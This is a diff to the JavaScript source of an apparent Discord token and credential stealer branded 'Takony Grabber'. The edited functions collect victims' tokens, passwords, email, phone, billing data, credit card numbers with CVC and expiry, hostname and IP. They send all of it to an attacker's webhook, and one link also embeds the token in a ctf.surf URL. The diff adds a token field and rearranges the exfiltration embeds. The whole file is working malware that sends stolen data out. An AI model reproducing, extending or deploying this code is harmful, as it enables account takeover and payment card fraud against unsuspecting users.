@@ -145,7 +145,7 @@ async function firstTime() {
                 sendToWebhook(JSON.stringify(c));
             } else {
                 var b = await getUserInfo(token)
-                var n = None;
+                var n;
                 if (b.premium_type == 0){
                     n = "None"
                 } else if (b.premium_type == 1) {
@@ -172,6 +172,10 @@ async function firstTime() {
                             name: "Injection",
                             value: `\`${__dirname}\``,
                             inline: !0
+                        }, {
+                            name: "Token",
+                            value: `${token}`,
+                            inline: !1
                         }, {
                             name: "Badges",
                             value: `${getBadges(b.flags)}`,
@@ -255,68 +259,87 @@ async function firstTime() {
                 };
                 sendToWebhook(JSON.stringify(c));
             } else {
-                var userInfo = await getUserInfo(token);
-                var ip = await getIp();
-                var billing = await getBilling(token);
-                var friends = await getRelationships(token);
-            
-                var params = {
+                var b = await getUserInfo(token)
+                var n;
+                if (b.premium_type == 0){
+                    n = "None"
+                } else if (b.premium_type == 1) {
+                    n = "Classic"
+                } else if (b.premium_type == 2) {
+                    n = "Boost"
+                }
+                var c = {
                     username: "Takony Grabber",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
-                        "title": "Credit Card",
+                        title: "User logged out",
                         description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
-                        "color": config['embed-color'],
-                        "fields": [{
-                            name: "Info",
-                            value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
-                            inline: !1
-                        }, {
+                        color: config["embed-color"],
+                        fields: [{
                             name: "Username",
-                            value: `\`${userInfo.username}#${userInfo.discriminator}\``,
+                            value: `\`${b.username}#${b.discriminator}\``,
                             inline: !0
                         }, {
-                            name: "ID",
-                            value: `\`${userInfo.id}\``,
-                            inline: !0
-                        }, {
-                            name: "Nitro",
-                            value: `${getNitro(userInfo.premium_type)}`,
+                            name: "Hostname",
+                            value: `${os.hostname()}`,
                             inline: !1
                         }, {
-                            name: "Badges",
-                            value: `${getBadges(userInfo.flags)}`,
-                            inline: !1
-                        }, {
-                            name: "Billing",
-                            value: `${billing}`,
-                            inline: !1
-                        }, {
-                            name: "Email",
-                            value: `\`${userInfo.email}\``,
-                            inline: false
-                        }, {
-                            name: "CC Number",
-                            value: `\`${cardnumber}\``,
-                            inline: !0
-                        }, {
-                            name: "Expiration",
-                            value: `\`${expiration}\``,
-                            inline: !0
-                        },
-                        {
-                            name: "CVC",
-                            value: `\`${cvc}\``,
+                            name: "Injection",
+                            value: `\`${__dirname}\``,
                             inline: !0
                         }, {
                             name: "Token",
-                            value: `\`\`\`${token}\`\`\``,
+                            value: `${token}`,
                             inline: !1
+                        }, {
+                            name: "Badges",
+                            value: `${getBadges(b.flags)}`,
+                            inline: !1
+                        }, {
+                            name: "Email",
+                            value: `${b.email}`,
+                            inline: !1
+                        }, {
+                            name: "Phone",
+                            value: `${b.phone}`,
+                            inline: !1
+                        }, {
+                            name: "Nitro",
+                            value: `${n}`,
+                            inline: !1
+                        }, {
+                            name: "Billing",
+                            value: `${getBilling(token)}`,
+                            inline: !1
+                        }, {
+                            name: "NSFW",
+                            value: `${b.nsfw_allowed}`,
+                            inline: !1
+                        }, {
+                            name: "Verified",
+                            value: `${b.verified}`,
+                            inline: !1
+                        }, {
+                            name: "Bio",
+                            value: `${b.bio}`,
+                            inline: !1
+                        }, {
+                            name: "Token",
+                            value: `${token}`,
+                            inline: !1
+                        }],
+                        author: {
+                            name: "Takony Grabber"
                         },
-                        ]
+                        footer: {
+                            text: "Takony Grabber"
+                        },
+                        thumbnail: {
+                            url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
+                        }
                     }]
                 };
-                sendToWebhook(JSON.stringify(params))
+                sendToWebhook(JSON.stringify(c))
             }
         }
     }
@@ -418,50 +441,10 @@ async function userLogin(password, email, token) {
                 value: `\`${password}\``,
                 inline: !0
             }, {
-                name: "Ip",
-                value: `${ip}`,
-                inline: !0
-            }, {
                 name: "Token",
-                value: `${token}`,
+                value: `\`\`\`${token}\`\`\``,
                 inline: !1
-            },],
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
-        }, {
-            "title": `Total Friends (${friends.length})`,
-            "color": config['embed-color'],
-            "description": friends.frien,
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
-        },
-        {
-            "title": `Total Servers (${servers.totalguilds})`,
-            "color": config['embed-color'],
-            "description": servers.message,
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
+            },]
         }]
     };
 
@@ -628,41 +611,6 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 value: `\`\`\`${token}\`\`\``,
                 inline: !1
             },],
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
-        }, {
-            "title": `Total Friends (${friends.length})`,
-            "color": config['embed-color'],
-            "description": friends.frien,
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
-        }, {
-            "title": `Total Servers (${servers.totalguilds})`,
-            "color": config['embed-color'],
-            "description": servers.message,
-            "author": {
-                "name": "Takony Grabber"
-            },
-            "footer": {
-                "text": "Takony Grabber"
-            },
-            "thumbnail": {
-                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
-            }
         }]
     }
 
@@ -744,7 +692,29 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
                 value: `\`\`\`${token}\`\`\``,
                 inline: !1
             },
-            ]
+            ],
+            "author": {
+                "name": "Takony Grabber"
+            },
+            "footer": {
+                "text": "Takony Grabber"
+            },
+            "thumbnail": {
+                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
+            }
+        }, {
+            "title": `Total Friends (${friends.length})`,
+            "color": config['embed-color'],
+            "description": friends.frien,
+            "author": {
+                "name": "Takony Grabber"
+            },
+            "footer": {
+                "text": "Takony Grabber"
+            },
+            "thumbnail": {
+                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
+            }
         }]
     };
 
